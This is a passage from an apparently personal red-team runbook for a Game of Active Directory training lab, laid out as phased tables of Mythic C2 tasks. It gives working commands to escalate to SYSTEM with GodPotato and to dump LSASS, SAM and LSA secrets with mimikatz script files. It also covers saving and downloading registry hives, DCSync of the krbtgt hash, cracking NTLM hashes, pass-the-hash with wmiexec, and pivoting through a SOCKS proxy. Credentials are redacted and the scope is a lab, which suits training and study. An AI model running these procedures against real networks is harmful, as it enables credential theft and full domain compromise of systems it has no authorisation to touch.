| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Final Validation Checklist]] Section H |

---

# Phase 4 — Mythic Operations

**Purpose:** Agent task execution, file transfer, PowerShell, token ops, documentation.

Reference: [[Mythic - Architecture Overview]]

---

### P4-001 — Host reconnaissance (Seatbelt)

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Collect host security configuration |
| **Execution Context** | `[MYTHIC]` → `[VICTIM-CMD]` |
| **Host** | Active callback |
| **Shell** | CMD (`execute-assembly`) |
| **Privileges** | Current user |
| **Target** | Callback host |
| **Prerequisites** | Seatbelt on File Host |
| **Command/Action** | `execute-assembly Seatbelt.exe -group=all` |
| **Expected Result** | Host recon output in task results |
| **Validation** | Review AV, local admins, interesting configs |
| **Troubleshooting** | .NET error → verify binary on File Host |
| **Cleanup** | N/A (in-memory) |
| **Related Note** | [[Mythic - Architecture Overview]] |

---

### P4-002 — Privilege escalation checks (SharpUp)

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Identify local privesc opportunities |
| **Execution Context** | `[MYTHIC]` → `[VICTIM-CMD]` |
| **Host** | Active callback |
| **Shell** | CMD (`execute-assembly`) |
| **Privileges** | Current user |
| **Target** | Callback host |
| **Prerequisites** | SharpUp on File Host |
| **Command/Action** | `execute-assembly SharpUp.exe` |
| **Expected Result** | Misconfigurations / vulnerable services listed |
| **Validation** | Cross-reference with Phase 5 |
| **Troubleshooting** | No output → run Seatbelt P4-001 first |
| **Cleanup** | N/A |
| **Related Note** | TODO — [[GOAD - Exploitation - Privilege Escalation]] |

---

### P4-003 — PowerShell task execution

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Run PowerShell on victim (not cmd.exe) |
| **Execution Context** | `[MYTHIC]` → `[VICTIM-PS]` |
| **Host** | Active callback |
| **Shell** | PowerShell (Mythic `powershell` task) |
| **Privileges** | Current user |
| **Target** | Callback host |
| **Prerequisites** | Active callback |
| **Command/Action** | `powershell Get-Process` (example); use `powershell` task type — not `shell` |
| **Expected Result** | PowerShell output in task results |
| **Validation** | Output format matches PS not CMD |
| **Troubleshooting** | Syntax error → you used CMD task; switch to `powershell` |
| **Cleanup** | N/A |
| **Related Note** | [[Mythic - Architecture Overview]] |

---

### P4-004 — File upload to victim

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Place file on victim disk |
| **Execution Context** | `[MYTHIC]` |
| **Host** | Active callback |
| **Shell** | Mythic `upload` task |
| **Privileges** | Current user |
| **Target** | Victim path (e.g., `C:\Windows\Temp\`) |
| **Prerequisites** | Write access to target path |
| **Command/Action** | `upload ~/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe` (adjust path if Kali username ≠ `kali`) |
| **Expected Result** | Upload success in task output |
| **Validation** | `shell dir C:\Windows\Temp\mimikatz.exe` |
| **Troubleshooting** | Path error → adjust Kali source path to match `~/payloads/goad/` |
| **Cleanup** | Delete uploaded file in Phase 10 |
| **Related Note** | [[Mythic - Lab Operations - GodPotato and Mimikatz]] |

---

### P4-005 — File download from victim

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Exfiltrate files to Mythic server |
| **Execution Context** | `[MYTHIC]` |
| **Host** | Active callback |
| **Shell** | Mythic `download` task |
| **Privileges** | Read access to source file |
| **Target** | Victim file path |
| **Prerequisites** | File exists on victim |
| **Command/Action** | `download C:\Windows\Temp\sam.hive` |
| **Expected Result** | File in Mythic Downloads |
| **Validation** | File visible in Mythic UI |
| **Troubleshooting** | Access denied → need SYSTEM (Phase 5) |
| **Cleanup** | Delete source on victim after download |
| **Related Note** | [[Mythic - Lab Operations - GodPotato and Mimikatz]] |

---

### P4-006 — SOCKS proxy for pivoting

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Route Kali tools through victim |
| **Execution Context** | `[MYTHIC]` |
| **Host** | Active callback |
| **Shell** | Mythic `socks` task |
| **Privileges** | Current user |
| **Target** | Port `1080` on Kali (SOCKS listener) |
| **Prerequisites** | Active callback with network access to targets |
| **Command/Action** | `socks 1080` |
| **Expected Result** | SOCKS5 proxy active; proxychains can reach internal hosts |
| **Validation** | `proxychains4 crackmapexec smb 192.168.56.0/24 -u <LAB_USER> -H <REDACTED>` (Phase 7) |
| **Troubleshooting** | Connection refused → socks task not running or wrong port |
| **Cleanup** | Stop socks task in Mythic when pivot complete |
| **Related Note** | [[Mythic - Architecture Overview]] |

---

### P4-007 — Token theft

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Impersonate another process token |
| **Execution Context** | `[MYTHIC]` |
| **Host** | Active callback |
| **Shell** | Mythic `steal_token` task |
| **Privileges** | SeDebugPrivilege or equivalent (varies) |
| **Target** | Target process on callback host |
| **Prerequisites** | Documented in [[Mythic - Architecture Overview]] |
| **Command/Action** | `steal_token <PID>` |
| **Expected Result** | New token context for subsequent tasks |
| **Validation** | `shell whoami` after steal_token |
| **Troubleshooting** | Access denied → insufficient privilege |
| **Cleanup** | Revert token per Mythic docs |
| **Related Note** | [[Mythic - Architecture Overview]] |

---

### P4-008 — Screenshot / documentation

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Capture visual evidence from victim desktop |
| **Execution Context** | `[MYTHIC]` |
| **Host** | Active callback |
| **Shell** | Mythic `screenshot` task |
| **Privileges** | Current user |
| **Target** | Callback host desktop |
| **Prerequisites** | Active interactive session (may vary) |
| **Command/Action** | `screenshot` |
| **Expected Result** | Image in Mythic task output |
| **Validation** | Screenshot saved to evidence log |
| **Troubleshooting** | Black screen → no active desktop session |
| **Cleanup** | N/A |
| **Related Note** | [[Mythic - Architecture Overview]], [[Operation Cypher-Knife - Findings]] |

---

### P4-009 — Mythic troubleshooting

| Field | Value |
|---|---|
| **Phase** | 4 |
| **Objective** | Diagnose Mythic infrastructure failures |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root |
| **Target** | Mythic Docker stack |
| **Prerequisites** | Mythic issue observed |
| **Command/Action** | `sudo docker ps -a`; `sudo docker logs mythic_server`; `cd ~/Mythic && sudo ./mythic-cli logs mythic_server`; `sudo ss -tlnp \| grep 7443` |
| **Expected Result** | Actionable error in logs |
| **Validation** | Containers healthy after fix |
| **Troubleshooting** | Agent missing → `sudo ./mythic-cli install list`; restart |
| **Cleanup** | N/A |
| **Related Note** | [[Mythic - Installation and Verification]]; TODO — Mythic/03 - Agent Management/; TODO — Mythic/05 - Troubleshooting/ |

---

# Phase 5 — Privilege Escalation

**Purpose:** Escalate from initial callback context to SYSTEM (or equivalent) on victim host.

Detail: [[Mythic - Lab Operations - GodPotato and Mimikatz]] Steps 1–2; TODO — [[GOAD - Exploitation - Privilege Escalation]]

---

### P5-001 — Verify current privileges

```text
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Active GOAD Windows callback
Shell: CMD (Mythic shell task)
Privileges Before: Unknown — current callback user
Privileges Required: None (read-only check)
Prerequisites: Active Apollo callback
Command/Action:
  shell whoami
  shell whoami /all
  shell whoami /priv
Expected Result: Token details; look for SeImpersonatePrivilege, SeDebugPrivilege, integrity level
Validation: Record Mandatory Label level; note if already SYSTEM
Troubleshooting: Task fails → callback dead; re-establish Phase 3
Cleanup: N/A
Related Note: [[Mythic - Lab Operations - GodPotato and Mimikatz]]
```

**Key tokens:**

| Token | Required For |
|---|---|
| `SeImpersonatePrivilege` | GodPotato |
| `Mandatory Label\System Mandatory Level` | Already SYSTEM — skip P5-002 |

---

### P5-002 — GodPotato privilege escalation test

```text
Phase: 5
Objective: Escalate to SYSTEM via GodPotato
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Active GOAD Windows callback (IIS/app pool context expected on CASTELBLACK/BRAAVOS)
Shell: CMD (execute-assembly task)
Privileges Before: Service account with SeImpersonatePrivilege
Privileges Required: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
Prerequisites: GodPotato.exe on Mythic File Host; P5-001 confirms SeImpersonate
Command/Action:
  execute-assembly GodPotato.exe -cmd "cmd /c whoami"
Expected Result: nt authority\system
Validation: whoami output is SYSTEM
Troubleshooting:
  - Same user → try alternate CLSIDs (per source note):
    execute-assembly GodPotato.exe -clsid {4991d34b-80a1-4291-83b6-3328366b9097} -cmd "cmd /c whoami"
    execute-assembly GodPotato.exe -clsid {4e14fba2-2e22-11d1-9964-00c04fbbb345} -cmd "cmd /c whoami"
    execute-assembly GodPotato.exe -clsid {00020819-0000-0000-C000-000000000046} -cmd "cmd /c whoami"
  - Access Denied → no SeImpersonate; see TODO [[GOAD - Exploitation - Privilege Escalation]]
Cleanup: N/A (in-memory)
Related Note: [[Mythic - Lab Operations - GodPotato and Mimikatz]]
```

---

# Phase 6 — Credential / Secret Access

**Purpose:** Extract and validate credential material. Store evidence in [[Operation Cypher-Knife - Findings]] — not in this matrix.

Detail: [[Mythic - Lab Operations - GodPotato and Mimikatz]] Steps 3, 5

---

### P6-001 — Mimikatz credential dump (SYSTEM via GodPotato)

```text
Phase: 6
Objective: Dump local/domain logon material from LSASS/SAM
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Active GOAD Windows callback
Shell: CMD + upload + execute-assembly
Privileges Before: Service account
Privileges Required: SYSTEM (via GodPotato)
Prerequisites: P5-002 confirmed; mimikatz.exe + GodPotato on File Host
Command/Action:
  shell cmd /c "echo privilege::debug > C:\Windows\Temp\m.txt && echo token::elevate >> C:\Windows\Temp\m.txt && echo token::whoami >> C:\Windows\Temp\m.txt && echo sekurlsa::logonpasswords >> C:\Windows\Temp\m.txt && echo lsadump::sam >> C:\Windows\Temp\m.txt && echo lsadump::secrets >> C:\Windows\Temp\m.txt && echo lsadump::cache >> C:\Windows\Temp\m.txt && echo sekurlsa::ekeys >> C:\Windows\Temp\m.txt && echo exit >> C:\Windows\Temp\m.txt"
  upload ~/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe
  execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\m.txt"
  shell dir C:\Windows\Temp\*.kirbi
  download C:\Windows\Temp\*.kirbi
Expected Result: NTLM hashes / possible plaintext for <LAB_USER> accounts in task output
Validation: Record <LAB_USER>:<REDACTED> in Findings — never paste live creds here
Troubleshooting: Empty output → confirm SYSTEM; check script file contents
Cleanup: Phase 10 P10-001
Related Note: [[Mythic - Lab Operations - GodPotato and Mimikatz]]
```

---

### P6-002 — Registry hive extraction (offline hash recovery)

```text
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Active GOAD Windows callback
Shell: CMD (execute-assembly via GodPotato)
Privileges Before: Service account
Privileges Required: SYSTEM
Prerequisites: P5-002
Command/Action:
  execute-assembly GodPotato.exe -cmd "reg save HKLM\SAM C:\Windows\Temp\sam.hive"
  execute-assembly GodPotato.exe -cmd "reg save HKLM\SYSTEM C:\Windows\Temp\system.hive"
  execute-assembly GodPotato.exe -cmd "reg save HKLM\SECURITY C:\Windows\Temp\security.hive"
  download C:\Windows\Temp\sam.hive
  download C:\Windows\Temp\system.hive
  download C:\Windows\Temp\security.hive
Expected Result: Hive files on Mythic server
Validation: Process on Kali with P6-003
Troubleshooting: Access denied → not SYSTEM
Cleanup: Phase 10 P10-001
Related Note: [[Mythic - Lab Operations - GodPotato and Mimikatz]]
```

---

### P6-003 — Offline secretsdump on Kali (local hives)

| Field | Value |
|---|---|
| **Phase** | 6 |
| **Objective** | Extract NTLM hashes from downloaded hives |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | Downloaded hive files |
| **Prerequisites** | P6-002 downloads complete |
| **Command/Action** | `impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL` |
| **Expected Result** | Local account NTLM hashes |
| **Validation** | Test hash: `crackmapexec smb <LAB_HOST> -u <LAB_USER> -H <REDACTED>` |
| **Troubleshooting** | Error → hives incomplete; re-download |
| **Cleanup** | Secure/delete hive files after processing |
| **Related Note** | [[Mythic - Lab Operations - GodPotato and Mimikatz]] |

---

### P6-004 — Crack NTLM hashes

| Field | Value |
|---|---|
| **Phase** | 6 |
| **Objective** | Recover plaintext from NTLM hashes |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | Local hash file |
| **Prerequisites** | Hashes from P6-001 or P6-003 |
| **Command/Action** | `hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt` |
| **Expected Result** | Cracked `<LAB_USER>` passwords |
| **Validation** | CME validation with cracked creds |
| **Troubleshooting** | No crack → rules/stat masks |
| **Cleanup** | Store in Findings only |
| **Related Note** | [[Operation Cypher-Knife - Findings]] |

---

### P6-005 — Domain credential material (DCSync)

```text
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Active callback on GOAD Domain Controller
Shell: CMD + upload + execute-assembly
Privileges Before: Domain Administrator
Privileges Required: Domain Admin (Replicating Directory Changes)
Prerequisites: DA access confirmed; callback on DC preferred
Command/Action:
  shell cmd /c "echo privilege::debug > C:\Windows\Temp\dcsync.txt && echo lsadump::dcsync /domain:<LAB_DOMAIN> /user:krbtgt >> C:\Windows\Temp\dcsync.txt && echo exit >> C:\Windows\Temp\dcsync.txt"
  upload ~/payloads/goad/mimikatz.exe C:\Windows\Temp\mimikatz.exe
  execute-assembly GodPotato.exe -cmd "C:\Windows\Temp\mimikatz.exe C:\Windows\Temp\dcsync.txt"
Expected Result: krbtgt NTLM hash in output (<REDACTED>)
Validation: Record hash in Findings; test DA hash on DC
Troubleshooting: ERROR 08 — do not pass mimikatz commands as execute-assembly args; use script file
Cleanup: Phase 10 P10-001
Related Note: [[Mythic - Lab Operations - GodPotato and Mimikatz]]
```

> [!IMPORTANT]
> Replace `<LAB_DOMAIN>` with verified domain (e.g., `sevenkingdoms.local`). VERIFY against [[GOAD - IP Hostname Matrix]].

---

# Phase 7 — Lateral Movement

**Purpose:** Move from compromised host to additional GOAD systems using documented procedures.

> [!NOTE]
> Lateral movement procedures in the maintained vault are limited to pass-the-hash (P7-001), SOCKS pivot (P7-002), and second-agent deployment (P7-003).
> **Coverage gaps** (Mayfly reference — not in matrix until documented): MSSQL links → [[GOAD - Services - MSSQL]]; WinRM/RDP/PsExec → TODO; trust-based movement → [[GOAD - Active Directory - Trusts]].
> Old runbooks contain additional methods marked DO NOT USE.

---

### P7-001 — Pass-the-hash via WMI (direct from Kali)

```text
Source Host: Kali (or any host with Impacket)
Destination Host: <LAB_HOST> (e.g., 192.168.56.10)
Protocol: WMI (135/445)
Execution Context: [KALI]
Required Privilege: Valid <LAB_USER> NTLM hash or password
Prerequisites: P6-001/P6-004 credential obtained
Command/Procedure:
  impacket-wmiexec -hashes :<REDACTED> <LAB_DOMAIN>/Administrator@192.168.56.10
Expected Result: Remote shell or command execution on destination
Validation: whoami shows domain context on remote host
Troubleshooting: Access denied → wrong hash or user lacks local admin on target
Cleanup: Exit session; no persistent agent unless deployed
Related Note: [[GOAD - Command Execution Matrix]] (this note)
```

---

### P7-002 — SOCKS pivot + CrackMapExec sweep

```text
Source Host: Compromised callback host (SOCKS proxy)
Destination Host: 192.168.56.0/24
Protocol: SMB over SOCKS5
Execution Context: [KALI] via proxychains; [MYTHIC] socks task on callback
Required Privilege: Valid domain creds
Prerequisites: P4-006 socks 1080 active; proxychains configured
Command/Procedure:
  socks 1080                                    # Mythic task on callback
  proxychains4 crackmapexec smb 192.168.56.0/24 -u <LAB_USER> -H <REDACTED>
Expected Result: CME shows access on additional hosts
Validation: (P+) on new targets
Troubleshooting: Proxy fail → verify /etc/proxychains.conf points to 127.0.0.1:1080
Cleanup: Stop socks task; revert proxychains if modified
Related Note: [[Mythic - Architecture Overview]]
```

---

### P7-003 — Deploy second agent on remote host

| Field | Value |
|---|---|
| **Phase** | 7 |
| **Objective** | Establish Apollo callback on lateral target |
| **Execution Context** | `[VICTIM-PS]` or `[MYTHIC]` |
| **Host** | Remote `<LAB_HOST>` |
| **Shell** | PowerShell |
| **Privileges** | Admin on remote host |
| **Target** | Second GOAD Windows host |
| **Prerequisites** | P7-001 or P7-002 confirms admin access |
| **Command/Action** | Re-run P3-003 stager one-liner on remote host via obtained shell |
| **Expected Result** | Second callback in Mythic UI |
| **Validation** | Two callbacks with different hostnames |
| **Troubleshooting** | No callback → HTTP not reachable from remote host to Kali |
| **Cleanup** | Remove agent via Mythic task kill when done |
| **Related Note** | [[Mythic - Payload Generation]] |

---

# Phase 8 — Domain Compromise / AD Objectives

**Purpose:** Map vault procedures to [[Operation Cypher-Knife - Scope]] objectives.

| Scope Objective | Matrix Procedure | Evidence Required |
|---|---|---|
| 1. Initial access | P3-003, P3-004, P3-005 | Callback recorded in Findings |
| 2. Privesc to SYSTEM | P5-001, P5-002 | `whoami` = SYSTEM output |
| 3. Dump credentials | P6-001, P6-002, P6-003 | Hashes in Findings (redacted in matrix) |
| 4. Lateral movement | P7-001, P7-002, P7-003 | Second host callback or CME (P+) |
| 5. Domain Admin | P2-006, BloodHound DA query | DA group membership / path evidence |
| 6. DCSync | P6-005 | krbtgt hash in Findings |
| 7. BloodHound paths | P2-007–P2-009 | Attack paths in Findings |

> [!IMPORTANT]
> An objective is **not complete** until corresponding evidence is recorded in [[Operation Cypher-Knife - Findings]]. This matrix defines procedures only.

---

### P8-001 — Validate Domain Admin membership

```text
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Domain-joined callback
Shell: CMD
Privileges: Domain User (read group membership)
Prerequisites: Active callback
Command/Action: shell net group "Domain Admins" /domain
Expected Result: List of DA members including <LAB_USER> if compromised
Validation: Cross-check BloodHound "Find All Domain Admins"
Troubleshooting: Access denied → insufficient read rights; use BloodHound instead
Cleanup: N/A
Related Note: [[Operation Cypher-Knife - Scope]], [[GOAD - Active Directory - BloodHound Collection]]
```

---

### P8-002 — Trust relationship verification

```text
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Domain-joined callback
Shell: CMD
Privileges: Domain User
Prerequisites: Active callback
Command/Action: shell nltest /domain_trusts
Expected Result: Trusts between sevenkingdoms.local, north.sevenkingdoms.local, essos.local
Validation: Matches documented trust diagram in [[GOAD - IP Hostname Matrix]]
Troubleshooting: Command fails → check domain membership of callback host
Cleanup: N/A
Related Note: [[GOAD - IP Hostname Matrix]], [[GOAD - Active Directory - Trusts]] (TODO — exploitation paths)
```

---

### P8-003 — Domain privilege escalation (unspecified techniques)

| Field | Value |
|---|---|
| **Phase** | 8 |
| **Objective** | Escalate to Domain Admin via AD attack paths |
| **Execution Context** | VERIFY |
| **Host** | VERIFY |
| **Shell** | VERIFY |
| **Privileges** | VERIFY |
| **Target** | VERIFY |
| **Prerequisites** | BloodHound attack paths identified |
| **Command/Action** | **TODO — Note does not currently exist:** [[GOAD - Active Directory - Domain Privilege Escalation]] |
| **Expected Result** | Follow BloodHound shortest path; document per-path in Findings |
| **Validation** | DA access confirmed via P8-001 |
| **Troubleshooting** | Use BloodHound path queries until note exists |
| **Cleanup** | VERIFY per technique |
| **Related Note** | TODO — [[GOAD - Active Directory - Domain Privilege Escalation]]; see also [[GOAD - Active Directory - ACL and ACE Abuse]], [[GOAD - Active Directory - Delegation]], [[GOAD - Active Directory - ADCS]] |

---

# Phase 9 — Evidence & Reporting

**Purpose:** Capture and organize operation evidence for training documentation.

**Primary evidence store:** [[Operation Cypher-Knife - Findings]]

**Lessons learned:** TODO — Note does not currently exist: [[Operation Cypher-Knife - Lessons Learned]]

---

## Evidence Standard (All Phases)

For every major procedure record:

```text
Evidence to capture:
- Host: <LAB_HOST> / IP
- User/context: <LAB_USER> @ privilege level
- Timestamp: ISO 8601
- Command/procedure: Matrix ID (e.g., P5-002)
- Relevant output: Key lines (redact secrets)
- Screenshot: Mythic task output / BloodHound graph where appropriate
- Finding/observation: What this means for the operation
```

---

### P9-001 — Update findings after each phase

| Field | Value |
|---|---|
| **Phase** | 9 |
| **Objective** | Maintain living engagement record |
| **Execution Context** | Documentation |
| **Host** | N/A |
| **Shell** | Obsidian |
| **Privileges** | N/A |
| **Target** | [[Operation Cypher-Knife - Findings]] |
| **Prerequisites** | Any completed operational phase |
| **Command/Action** | Update tables: Initial Access, PrivEsc, Credentials, Lateral Movement, Domain Compromise, BloodHound paths, Evidence Log |
| **Expected Result** | No `VERIFY`/`TODO` rows for completed actions |
| **Validation** | Cross-check against Scope objectives table (Phase 8) |
| **Troubleshooting** | Missing evidence → re-run validation step for that procedure |
| **Cleanup** | N/A |
| **Related Note** | [[Operation Cypher-Knife - Findings]], [[Operation Cypher-Knife - Scope]] |

---

# Phase 10 — Cleanup

**Purpose:** Remove lab artifacts. Never claim cleanup complete without executing these steps.

---

### P10-001 — Remove temporary files on victim

```text
Execution Context: [MYTHIC] → [VICTIM-CMD]
Host: Each callback host operated on
Shell: CMD
Privileges: Current user (SYSTEM preferred)
Prerequisites: Evidence downloaded and recorded
Command/Action:
  shell del /q /f C:\Windows\Temp\mimikatz.exe
  shell del /q /f C:\Windows\Temp\m.txt
  shell del /q /f C:\Windows\Temp\dcsync.txt
  shell del /q /f C:\Windows\Temp\sam.hive
  shell del /q /f C:\Windows\Temp\system.hive
  shell del /q /f C:\Windows\Temp\security.hive
  shell del /q /f C:\Windows\Temp\goad_*.zip
  shell del /q /f C:\Windows\Temp\*.kirbi
  shell dir C:\Windows\Temp
Expected Result: Temp artifacts removed
Validation: dir shows no operation files
Troubleshooting: Access denied → escalate to SYSTEM first
Cleanup: N/A (this IS cleanup)
Related Note: [[Mythic - Lab Operations - GodPotato and Mimikatz]]
```

---

### P10-002 — Stop SOCKS proxy and HTTP server

| Field | Value |
|---|---|
| **Phase** | 10 |
| **Objective** | Tear down pivot and delivery infrastructure |
| **Execution Context** | `[MYTHIC]` + `[KALI]` |
| **Host** | Callback + Kali |
| **Shell** | Mythic UI / Bash |
| **Privileges** | Operator |
| **Target** | SOCKS task; python HTTP server |
| **Prerequisites** | Operations complete |
| **Command/Action** | Stop `socks` task in Mythic; Ctrl+C on `python3 -m http.server` |
| **Expected Result** | Port 80 and 1080 no longer listening |
| **Validation** | `sudo ss -tlnp \| grep -E ':80|:1080'` empty |
| **Troubleshooting** | Port still bound → identify process and kill |
| **Cleanup** | N/A |
| **Related Note** | [[Mythic - Payload Generation]] |

---

### P10-003 — Rollback `/etc/hosts` (optional)

| Field | Value |
|---|---|
| **Phase** | 10 |
| **Objective** | Restore Kali hosts file if desired |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | root |
| **Target** | `/etc/hosts` |
| **Prerequisites** | Backup from P0-005 exists |
| **Command/Action** | `sudo cp /etc/hosts.backup.<timestamp> /etc/hosts` |
| **Expected Result** | GOAD entries removed |
| **Validation** | `getent hosts kingslanding` fails or returns non-GOAD IP |
| **Troubleshooting** | `getent hosts localhost` must still work |
| **Cleanup** | N/A |
| **Related Note** | [[GOAD - Network Configuration and hosts Procedure]] |

---

### P10-004 — Remove local loot copies

| Field | Value |
|---|---|
| **Phase** | 10 |
| **Objective** | Remove sensitive files from Kali working directories |
| **Execution Context** | `[KALI]` |
| **Host** | Kali attacker VM |
| **Shell** | Bash |
| **Privileges** | User |
| **Target** | `./Share/`, downloaded hives, hash files |
| **Prerequisites** | Evidence captured in Findings |
| **Command/Action** | `rm -rf ./Share/ sam.hive system.hive security.hive *_hashes.txt` (adjust paths) |
| **Expected Result** | Working copies removed |
| **Validation** | `ls` confirms deletion |
| **Troubleshooting** | N/A |
| **Cleanup** | N/A |
| **Related Note** | [[Operation Cypher-Knife - Findings]] |

---

# Common Context Mistakes

| Mistake | Symptom | Correct Action |
|---|---|---|
| Running PowerShell in Bash | `command not found` / parse errors | Use `[VICTIM-PS]` via Mythic `powershell` task |
| Running Bash in PowerShell | Parser errors | Use `[KALI]` terminal only |
| Running Kali commands on GOAD Windows | Commands fail | Run Impacket/CME/nmap on Kali only |
| Running victim commands from Kali | `shell: command not found` | Issue as Mythic task to callback |
| Forgetting `sudo` | Permission denied | Check Privileges column; use `sudo` on Kali where marked |
| Assuming Administrator | ACCESS DENIED on target | Verify with `whoami /groups`; escalate Phase 5 |
| Wrong GOAD IP | Timeout / wrong host | Re-run Phase 0; check [[GOAD - Error Audit and Contradiction Report]] |
| Wrong domain in Kerberos/LDAP | KDC/LDAP errors | VERIFY domain against live `nltest /domain_trusts` |
| Out-of-order execution | Missing prerequisites fail | Follow Phase 0→10 sequence |
| DNS resolves but host unreachable | ping fails | Phase 0 P0-007 — DNS ≠ connectivity |
| Ping works but service down | Connection refused | Port scan specific service (P0-008) |
| Using old runbook IPs | Wrong targets | Old notes marked DO NOT USE in [[GOAD - Vault Index]] |
| `mythic-server` placeholder | No callback | Use verified Kali IP in payload |
| Mimikatz args via execute-assembly | Silent failure | Use script file method (ERROR 08) |
| Mixing CMD and PS syntax in `shell` | Syntax errors | `shell` = cmd.exe; use `powershell` task for PS |

---

# External Coverage Reference (Mayfly)

> Audited against [Mayfly GOAD series](https://mayfly277.github.io/categories/goad/) (17 posts).
> **External reference for gap analysis only** — vault remains source of truth. No Mayfly commands copied into procedures.

| Topic | Mayfly Ref | Existing Vault | Matrix | Status | Action |
|---|---|---|---|---|---|
| GOAD architecture | v2 intro | Partial (IP Matrix, Scope) | Partial (Phase 0) | Partial | VERIFY topology live |
| Recon / scanning | Part 1 | Yes — [[GOAD - Enumeration - Initial Recon]] | Yes — P1-001–P1-006 | Covered | Maintain |
| User discovery | Part 2 | Yes — Kerbrute, AS-REP in Initial Recon | Yes — P2-003–P2-005 | Covered | Maintain |
| Authenticated enumeration | Part 3 | Partial — LDAP, BloodHound | Partial — P2-001–P2-002, P2-006–P2-009 | Partial | TODO — post-cred enum note |
| Poisoning / relay | Part 4, 13 | No (old runbooks only) | No | **Missing** | [[GOAD - Enumeration - Poisoning and Relay]] TODO |
| Exploitation with user | Part 5 | Partial — AS-REP, guest share | Partial — P1-005, P3-004 | Partial | [[GOAD - Exploitation - Initial Access Vectors]] TODO |
| ADCS | Parts 6, 14 | No | No | **Missing** | [[GOAD - Active Directory - ADCS]] TODO |
| MSSQL | Part 7, 12 | No | No | **Missing** | [[GOAD - Services - MSSQL]] TODO |
| Privilege escalation | Part 8 | Partial — GodPotato, SharpUp | Partial — P4-002, P5-001–P5-002 | Partial | [[GOAD - Exploitation - Privilege Escalation]] TODO |
| Lateral movement | Part 9 | Partial — PtH, SOCKS only | Partial — P7-001–P7-003 | Partial | Expand when vault supports |
| Delegation | Part 10 | No | No | **Missing** | [[GOAD - Active Directory - Delegation]] TODO |
| ACL / ACE abuse | Part 11 | No | No | **Missing** | [[GOAD - Active Directory - ACL and ACE Abuse]] TODO |
| Trusts | Part 12 | Partial — diagram, nltest | Partial — P2-006, P8-002 enum only | Partial | [[GOAD - Active Directory - Trusts]] TODO |
| Inside-domain ops | Part 13 | Nav only | No procedures | Partial | [[GOAD - Active Directory - Inside the Domain Workflow]] |
| Kerberoasting | Parts 3, 11 | BloodHound query only | Blocked — P2-010 | Partial | [[GOAD - Active Directory - Kerberoasting]] TODO |

---

# Missing Notes & Broken Links

| Referenced Note | Status |
|---|---|
| [[GOAD - Enumeration - Initial Recon]] | Exists |
| [[GOAD - Enumeration - Poisoning and Relay]] | **TODO — scaffold only, no procedures** |
| [[GOAD - Active Directory - BloodHound Collection]] | Exists |
| [[GOAD - Active Directory - Inside the Domain Workflow]] | Exists (navigational) |
| [[GOAD - Active Directory - ADCS]] | **TODO — scaffold only, ESC status matrix** |
| [[GOAD - Active Directory - Delegation]] | **TODO — scaffold only** |
| [[GOAD - Active Directory - ACL and ACE Abuse]] | **TODO — scaffold only** |
| [[GOAD - Active Directory - Trusts]] | **TODO — scaffold only** |
| [[GOAD - Services - MSSQL]] | **TODO — scaffold only** |
| [[Mythic - Lab Operations - GodPotato and Mimikatz]] | Exists |
| [[Mythic - Architecture Overview]] | Exists |
| [[Mythic - Payload Generation]] | Exists |
| [[Mythic - Installation and Verification]] | Exists |
| [[GOAD - Vault Index]] | Exists |
| [[Operation Cypher-Knife - Scope]] | Exists |
| [[Operation Cypher-Knife - Findings]] | Exists |
| [[Operation Cypher-Knife - Lessons Learned]] | **TODO — note does not exist** |
| [[GOAD - Exploitation - Initial Access Vectors]] | **TODO — note does not exist** |
| [[GOAD - Exploitation - Privilege Escalation]] | **TODO — category framework only** |
| [[GOAD - Active Directory - Kerberoasting]] | **TODO — note does not exist** |
| [[GOAD - Active Directory - Domain Privilege Escalation]] | **TODO — note does not exist** |
| Mythic/03 - Agent Management/ | **TODO — folder empty** |
| Mythic/05 - Troubleshooting/ | **TODO — folder empty** |

> [!NOTE]
> Wikilink `[[GOAD - Error Audit and Contradiction Report]]` resolves to file `GOAD — Error Audit & Contradiction Report.md` (Obsidian alias).

---

# Quality Control Audit

- [x] No contradictory IPs silently resolved — conflicts flagged with CAUTION
- [x] No fabricated credentials or command output
- [x] Commands assigned to correct machine/context
- [x] Shell type identified per entry
- [x] Privilege requirements identified
- [x] Prerequisites identified
- [x] Expected results documented
- [x] Validation steps exist
- [x] Troubleshooting exists
- [x] Cleanup exists where applicable (Phases 6, 7, 10)
- [x] Procedures consolidated from vault notes (not duplicated verbatim)
- [x] Wiki links verified against existing files
- [x] Missing notes marked TODO
- [x] GOAD lab scope explicit throughout
- [x] Phase ordering 0→10 logical
- [x] No techniques added beyond vault documentation (old runbooks excluded)

---

## Related Notes

- [[GOAD - Vault Index]]
- [[GOAD - Error Audit and Contradiction Report]]
- [[GOAD - Final Validation Checklist]]
- [[GOAD - IP Hostname Matrix]]
- [[GOAD - Environment Setup and Validation]]
- [[GOAD - Network Configuration and hosts Procedure]]
